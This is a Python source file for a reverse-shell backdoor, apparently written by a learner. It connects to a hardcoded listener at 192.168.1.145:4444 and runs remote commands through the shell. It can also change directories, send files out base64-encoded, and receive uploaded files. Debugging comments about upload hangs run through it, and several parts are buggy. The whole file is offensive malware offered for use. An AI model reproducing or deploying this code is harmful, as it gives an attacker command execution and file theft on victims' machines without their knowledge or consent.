import socket, json, sys, socket, subprocess, base64, os, tqdm
import re
import zlib
import linecache

class Backdoor:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
		self._buffer_size = 1024

	def PrintException(self):
			exc_type, exc_obj, tb = sys.exc_info()
			f = tb.tb_frame
			lineno = tb.tb_lineno
			filename = f.f_code.co_filename
			linecache.checkcache(filename)
			line = linecache.getline(filename, lineno, f.f_globals)
			return 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)


	def json_encode(self, data):
		json_data = json.dumps(data) #wrap data in json format
		return json_data.encode()

	def json_decode(self, json_data):
		decoded_json = json_data.decode() #wrap data in json format
		return json.loads(decoded_json)

	def dodgy_fragmented_receive(self, filename, filesize):

		base_filename = os.path.basename(filename)
		print("Base filename: " + base_filename)
		print("Filename: " + filename)
		filesize = int(filesize)

		#progress_bar = tqdm.tqdm(range(filesize), "Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
		byte_read_count = 0
		with open(base_filename, "wb") as file:
			while True:
			#while byte_read_count <= filesize:
				print("Received " + str(byte_read_count) + "/" + str(filesize) + " bytes")
				bytes_read = self.connection.recv(self._buffer_size)
				if bytes_read == "TRANS_COM":
					print("Transmission complete")
					break
				byte_read_count += 1024
				file.write(bytes_read)
			print("outside the loop")
			return "[+] {filename} uploaded successfully"

			
				


	def reliable_send(self, data):
		json_data = json.dumps(data) #wrap data in json format
		self.connection.send(json_data.encode())

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024) #seems hang is terminating here
				return json.loads(json_data.decode()) #unwrap json data
			except ValueError:
				print("stuck receving: " + str(json_data))
				continue

	def execute_system_command(self, command):
		return subprocess.check_output(command, shell=True)

	def change_working_directory_to(self, path):
		try:
			os.chdir(path)
			return "[+] Changing working directory to " + path
		except Exception:
			return self.PrintException()


	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload successful"


	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())

	#sometimes seems like I can only issue upload commands after uploading an image
	# this time it worked but when trying to upload wall2.jpg, it did not even send
	# path to getting stuck: wall.jpg, ps, op, be, meme, test.txt, ps, cd, wall.jpg, ps, cd, wall2.jpg -> hang

	# seems uploading wall2.jpg on its own causes the hang too
	# seems like wall2.jpg is corrupt? strange as it was working
	# maybe a read operation was interrupted or something weird happened

	# hang: text.txt, wall4.jpg (error not found), upload wall3.jpg, ps -> hang
	# issue happens trying to issue commands after upload wall4.png

	# when command hangs, reliable_recieve() seems to be appending the command to the end of a chunk of ascii bytes. Something is going wrong with the transmission which is resulting in incomplete transmisson of file data
		# problem is caused because reliable_receive() is not supposed to receive file data
	def run(self):
		#self.connection.send("\n[+] Welcome to hell\n")
		while True:
			try:
				command = self.reliable_receive() # will wait for data to be sent so that it can be received, will get a broken pipe if file/ data is larger than this
				if command[0] == "exit":
					self.connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory_to(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					filename = command[1]
					filesize = command[2]
					command_result = self.dodgy_fragmented_receive(filename, filesize)
					#command_result = "[+] Upload successful"
					#command_result = self.write_file(command[1], command[2]) #name, content
				else:
					command_result = self.execute_system_command(command)

				self.reliable_send(command_result)
			except Exception:
				exception = self.PrintException()
				self.reliable_send(("[-] An error has occured during execution on the backdoor", exception))
				
		#self.connection.close()
	
my_backdoor = Backdoor("192.168.1.145", 4444)
my_backdoor.run()